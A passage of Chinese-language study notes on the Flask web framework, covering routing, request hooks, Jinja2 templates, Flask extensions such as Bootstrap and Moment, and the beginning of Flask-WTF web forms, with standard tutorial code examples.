使用上下文临时把某些对象变为全局可访问,让特定的变量在一个线程中全局可访问，与此同时却不会干扰其他线程</p><p>在 Flask 中有两种上下文：程序上下文和请求上下文,上面的示例是请求上下文</p><p><img src="1611123396878.png" alt="1611123396878"></p><ul><li>请求调度</li></ul><p>程序收到客户端发来的请求时，要找到处理该请求的视图函数.为了完成这个任务，Flask会在程序的 URL 映射中查找请求的 URL</p><p>URL 映射是 URL 和视图函数之间的对应关系</p><p>Flask 使用<code> app.route</code> 修饰器或者非修饰器形式的 <code>app.add_url_rule() </code>生成映射</p><p>使用url_map查看映射</p><p><img src="1611123651901.png" alt="1611123651901"></p><blockquote><p><code> /static/&lt;filename&gt;</code> 路由是Flask 添加的特殊路由，用于访问静态文件</p></blockquote><ul><li>请求钩子</li></ul><p>请求钩子用于处理请求前后的一些工作</p><p>请求钩子使用修饰器实现,Flask 支持以下 4 种钩子</p><p>​    before_first_request :注册一个函数，在处理第一个请求之前运行。</p><p>​    before_request  ：注册一个函数，在每次请求之前运行。</p><p>​    after_request  ：注册一个函数，如果没有未处理的异常抛出，在每次请求之后运行。</p><p>​    teardown_request  ：注册一个函数，即使有未处理的异常抛出，也在每次请求之后运行。</p><ul><li><p>更丰富的响应</p><p>添加状态码</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Bad Request&lt;/h1&gt;&#x27;</span>, <span class="number">400</span></span><br></pre></td></tr></table></figure><p>​    返回cookie需要使用到<code>make_response</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    response = make_response(<span class="string">&#x27;&lt;h1&gt;This document carries a cookie!&lt;/h1&gt;&#x27;</span>)</span><br><span class="line">    response.set_cookie(<span class="string">&#x27;answer&#x27;</span>, <span class="string">&#x27;42&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>​    重定向</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line"><span class="keyword">return</span> redirect(<span class="string">&#x27;http://www.example.com&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​    处理错误</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> abort</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    user = load_user(<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">    abort(<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Hello, %s&lt;/h1&gt;&#x27;</span> % user.name</span><br></pre></td></tr></table></figure><h3 id="Flask扩展"><a href="#Flask扩展" class="headerlink" title="Flask扩展"></a>Flask扩展</h3><p>Flask 只有两个主要依赖：子系统Werkzeug和 模板系统 Jinja2, Werkzeug 和 Jinjia2 都是由 Flask 的核心开发者开发而成</p><p>Flask 并不原生支持数据库访问、Web 表单验证和用户认证等高级功能,这些功能以及其他大多数 Web 程序中需要的核心服务都以扩展的形式实现，然后再与核心包集成</p><p>所以Flask扩展很丰富</p><p>下面以Flask-Script来说明Flask扩展使用</p><blockquote><p>Flask-Script 是一个 Flask 扩展，为 Flask 程序添加了一个命令行解析器</p></blockquote><p>安装: <code>pip install flask-script</code></p><p>导入: <code>from flask_script import Manager</code></p><blockquote><p>from flask.ext.xxx 已经不再使用.改为 flask_xxx</p></blockquote><p>使用:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_script <span class="keyword">import</span> Manager</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">manager = Manager(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Hello World!&lt;/h1&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Hello, %s!&lt;/h1&gt;&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    manager.run()</span><br></pre></td></tr></table></figure><p>效果就是加了一些参数</p><p><img src="1611125055547.png" alt="1611125055547"></p><p>运行<code>python hello.py runserver</code></p><p><img src="1611125115144.png" alt="1611125115144"></p><p>–host指定监听ip <code>python hello.py runserver --host 0.0.0.0</code></p><h2 id="第三章-模板"><a href="#第三章-模板" class="headerlink" title="第三章 模板"></a>第三章 模板</h2><h3 id="Jinja2模板引擎"><a href="#Jinja2模板引擎" class="headerlink" title="Jinja2模板引擎"></a>Jinja2模板引擎</h3><ul><li><p>默认情况下，Flask 在程序文件夹中的 templates 子文件夹中寻找模板</p><p>模板示例:</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">templates/index.html:</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">templates/user.html</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123; name &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>渲染模板–<code>render_template</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>, name=name)</span><br></pre></td></tr></table></figure><p> render_template 函数的第一个参数是模板的文件名, 随后的参数都是键值对，表示模板中变量对应的真实值。</p><p>在这段代码中，第二个模板收到一个名为 name 的变量.左边的“name”表示参数名，就是模板中使用的占位符；右边的“name”是当前作用域中的变量，表示同名参数的值</p><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p><code>&#123;&#123; name &#125;&#125; </code>结构表示一个变量, 它是一种特殊的占位符,告诉模板引擎这个位置的值从渲染模板时使用的数据中获取</p><ul><li>复杂变量使用示例:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;A value from a dictionary: &#123;&#123; mydict[&#x27;key&#x27;] &#125;&#125;.&lt;/p&gt; # 字典</span><br><span class="line">&lt;p&gt;A value from a list: &#123;&#123; mylist[3] &#125;&#125;.&lt;/p&gt; # 列表</span><br><span class="line">&lt;p&gt;A value from a list, with a variable index: &#123;&#123; mylist[myintvar] &#125;&#125;.&lt;/p&gt; # 列表,变量组合</span><br><span class="line">&lt;p&gt;A value <span class="keyword">from</span> an <span class="built_in">object</span><span class="string">&#x27;s method: &#123;&#123; myobj.somemethod() &#125;&#125;.&lt;/p&gt; # 对象</span></span><br></pre></td></tr></table></figure><ul><li>过滤器</li></ul><p>可以使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, &#123;&#123; name|capitalize &#125;&#125; # 以首字母大写形式显示变量 name 的值</span><br></pre></td></tr></table></figure><p>常用过滤器</p><p><img src="1611126225191.png" alt="1611126225191"></p><blockquote><p>默认情况下，出于安全考虑，Jinja2 会转义所有变量,对信任的值使用safe过滤器,可以显示HTML代码</p></blockquote><p>完整过滤器列表 <a href="https://jinja.palletsprojects.com/en/2.11.x/templates/#builtin-filters">https://jinja.palletsprojects.com/en/2.11.x/templates/#builtin-filters</a></p><h4 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h4><p>条件控制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if user %&#125;</span><br><span class="line">    Hello, &#123;&#123; user &#125;&#125;!</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">    Hello, Stranger!</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>for循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;% for comment in comments %&#125;</span><br><span class="line">        &lt;li&gt;&#123;&#123; comment &#125;&#125;&lt;&#x2F;li&gt;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure><p>宏</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% macro render_comment(comment) %&#125;</span><br><span class="line">    &lt;li&gt;&#123;&#123; comment &#125;&#125;&lt;&#x2F;li&gt;</span><br><span class="line">&#123;% endmacro %&#125;</span><br><span class="line"></span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;% for comment in comments %&#125;</span><br><span class="line">        &#123;&#123; render_comment(comment) &#125;&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure><p>为了重复使用宏，我们可以将其保存在单独的文件中，然后在需要使用的模板中导入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% import &#39;macros.html&#39; as macros %&#125;</span><br><span class="line"></span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;% for comment in comments %&#125;</span><br><span class="line">        &#123;&#123; macros.render_comment(comment) &#125;&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure><p>需要在多处重复使用的模板代码片段可以写入单独的文件，再包含在所有模板中，以避免重复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include &#39;common.html&#39; %&#125;</span><br></pre></td></tr></table></figure><h3 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h3><ul><li><p>基模板:  base.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&#123;% block head %&#125;</span><br><span class="line">    &lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125; - My Application&lt;&#x2F;title&gt;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &#123;% block body %&#125;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></li><li><p>block 标签定义的元素可在衍生模板中修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;base.html&quot; %&#125; # extends</span><br><span class="line">&#123;% block title %&#125;Index&#123;% endblock %&#125;</span><br><span class="line">&#123;% block head %&#125;</span><br><span class="line">    &#123;&#123; super() &#125;&#125; # 使用 super() 获取原来的内容(原模版此处非空)</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">    &lt;h1&gt;Hello, World!&lt;&#x2F;h1&gt; </span><br><span class="line">&#123;% endblock </span><br></pre></td></tr></table></figure></li></ul><h3 id="Flask-Bootstrap"><a href="#Flask-Bootstrap" class="headerlink" title="Flask-Bootstrap"></a>Flask-Bootstrap</h3><p>安装扩展 <code>pip install flask-bootstrap</code></p><p>扩展初始化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br></pre></td></tr></table></figure><p>初始化 Flask-Bootstrap 之后，可以在程序中使用一个包含所有 Bootstrap 文件的基模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends <span class="string">&quot;bootstrap/base.html&quot;</span> %&#125;</span><br></pre></td></tr></table></figure><p>改写user.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;bootstrap&#x2F;base.html&quot; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block navbar %&#125;</span><br><span class="line">&lt;div class&#x3D;&quot;navbar navbar-inverse&quot; role&#x3D;&quot;navigation&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;navbar-header&quot;&gt;</span><br><span class="line">            &lt;button type&#x3D;&quot;button&quot; class&#x3D;&quot;navbar-toggle&quot;data-toggle&#x3D;&quot;collapse&quot; data-target&#x3D;&quot;.navbar-collapse&quot;&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;sr-only&quot;&gt;Toggle navigation&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;icon-bar&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;icon-bar&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;icon-bar&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;button&gt;</span><br><span class="line">            &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;&#x2F;&quot;&gt;Flasky&lt;&#x2F;a&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;navbar-collapse collapse&quot;&gt;</span><br><span class="line">            &lt;ul class&#x3D;&quot;nav navbar-nav&quot;&gt;</span><br><span class="line">                &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;&quot;&gt;Home&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">            &lt;&#x2F;ul&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;page-header&quot;&gt;</span><br><span class="line">        &lt;h1&gt;Hello, &#123;&#123; name &#125;&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>效果图</p><p><img src="1611127303938.png" alt="1611127303938"></p><blockquote><p>不过还是感觉直接写html更方便23333</p></blockquote><h3 id="自定义错误页面"><a href="#自定义错误页面" class="headerlink" title="自定义错误页面"></a>自定义错误页面</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>) </span><span class="comment"># 404，客户端请求未知页面或路由时显示</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>) </span><span class="comment"># 500，有未处理的异常时显示</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">internal_server_error</span>(<span class="params">e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span></span><br></pre></td></tr></table></figure><h3 id="url-for-链接"><a href="#url-for-链接" class="headerlink" title="url_for 链接"></a>url_for 链接</h3><p><code> url_for()</code>:使用程序 URL 映射中保存的信息生成 URL</p><p>用法: <code>    url_for(&#39;index&#39;)   </code>=&gt;<code>/</code></p><p>生成绝对地址 <code>url_for(&#39;index&#39;, _external=True)</code> =&gt;<code> http://localhost:5000/</code></p><p><code>url_for(&#39;user&#39;, name=&#39;john&#39;, _external=True)</code>=&gt;<code> http://localhost:5000/user/john</code></p><p><code>url_for(&#39;index&#39;, page=2)</code>=&gt; <code>/?page=2</code></p><h3 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h3><p>图片、JavaScript 源码文件和 CSS等</p><p>调用<code>url_for(&#39;static&#39;, filename=&#39;css/styles.css&#39;, _external=True)</code>会得到<code>http://localhost:5000/static/css/styles.css</code></p><p>使用示例: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block head %&#125;</span><br><span class="line">&#123;&#123; <span class="built_in">super</span>() &#125;&#125;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;shortcut icon&quot;</span> href=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename = &#x27;favicon.ico&#x27;) &#125;&#125;&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;image/x-icon&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;icon&quot;</span> href=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename = &#x27;favicon.ico&#x27;) &#125;&#125;&quot;</span><span class="built_in">type</span>=<span class="string">&quot;image/x-icon&quot;</span>&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h3 id="Flask-Moment"><a href="#Flask-Moment" class="headerlink" title="Flask-Moment"></a>Flask-Moment</h3><p>集成 moment.js到jinja2的一个flask拓展</p><p>安装<code> pip install flask-moment</code></p><p>初始化:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_moment <span class="keyword">import</span> Moment</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">moment = Moment(app)</span><br></pre></td></tr></table></figure><blockquote><p>Flask-Moment 还依赖 jquery.js ,</p><p>Bootstrap 已经引入了 jquery.js，因此只需引入 moment.js 即可</p></blockquote><p>在基模板的 scripts 块中引入这个库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#templates&#x2F;base.html</span><br><span class="line">&#123;% block scripts %&#125;</span><br><span class="line">    &#123;&#123; super() &#125;&#125;</span><br><span class="line">    &#123;&#123; moment.include_moment() &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,current_time=datetime.utcnow())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># templates&#x2F;index.html</span><br><span class="line">&#123;% extends &quot;base.html&quot; %&#125;</span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line">&#123;% block page_content %&#125;</span><br><span class="line">&lt;div class&#x3D;&quot;page-header&quot;&gt;</span><br><span class="line">    &lt;h1&gt;Hello World!&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;p&gt;The local date and time is &#123;&#123; moment(current_time).format(&#39;LLL&#39;) &#125;&#125;.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;That was &#123;&#123; moment(current_time).fromNow(refresh&#x3D;True) &#125;&#125;.&lt;&#x2F;p&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>format(‘LLL’) 根据客户端电脑中的时区和区域设置渲染日期和时间</p><p> fromNow() 渲染相对时间戳，而且会随着时间的推移自动刷新显示的时间</p><p>效果如图</p><p><img src="1611131969170.png" alt="1611131969170"></p><p>moment.js : <a href="http://momentjs.com/docs/#/displaying/">http://momentjs.com/docs/#/displaying/</a></p><h2 id="第四章-Web表单"><a href="#第四章-Web表单" class="headerlink" title="第四章 Web表单"></a>第四章 Web表单</h2><blockquote><p>处理表单可以使用 Flask-WTF 扩展 <a href="http://pythonhosted.org/Flask-WTF/">http://pythonhosted.org/Flask-WTF/</a></p><p>源自WTForms（<a href="http://wtforms.simplecodes.com)/">http://wtforms.simplecodes.com）</a></p></blockquote><p>安装 <code>pip install flask-wtf</code></p><h3 id="防御CSRF"><a href="#防御CSRF" class="headerlink" title="防御CSRF"></a>防御CSRF</h3><p>Flask-WTF 使用secret密钥生成加密令牌，再用令牌验证请求中表单数据的真伪</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;hard to guess string&#x27;</span> <span class="comment"># 强度就取决于这个密钥</span></span><br></pre></td></tr></table></figure><blockquote><p>这个SECRET_KEY密钥是通用的密钥 </p><p>Flask伪造session里面也见过这个密钥~</p></blockquote><h3 id="表单类"><a href="#表单类" class="headerlink" title="表单类"></a>表单类</h3><p>使用 Flask-WTF 时，每个 Web 表单都由一个继承自 Form 的类表示</p><p>Form中可包含多个字段, 每个字段都用相应类型的字段对象表示</p><p>字段对象可附属一个或多个验证函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> Form <span class="comment"># Form 基类</span></span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField <span class="comment"># 字段</span></span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> Required <span class="comment"># 验证函数</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span>(<span class="params">Form</span>):</span></span><br><span class="line">    name = StringField(<span class="string">&#x27;What is your name?&#x27;</span>, validators=[Required()]) <span class="comment"># validators验证函数列表</span></span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;Submit&#x27;</span>)</span><br></pre></td></tr></table></figure><p>WTForms支持的HTML标准字段:</p><p><img src="1611214430430.png" alt="1611214430430"></p><p>WTForms 内建的验证函数:</p><p><img src="1611214460940.png" alt="1611214460940"></p><p>将表单渲染为HTML</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123; form.hidden_tag() &#125;&#125;</span><br><span class="line">&#123;&#123; form.name.label &#125;&#125; &#123;&#123; form.name(id=&#x27;my-text-field&#x27;) &#125;&#125; # 指定该字段id属性 id=&#x27;my-text-field&#x27;</span><br><span class="line">&#123;&#123; form.submit() &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span 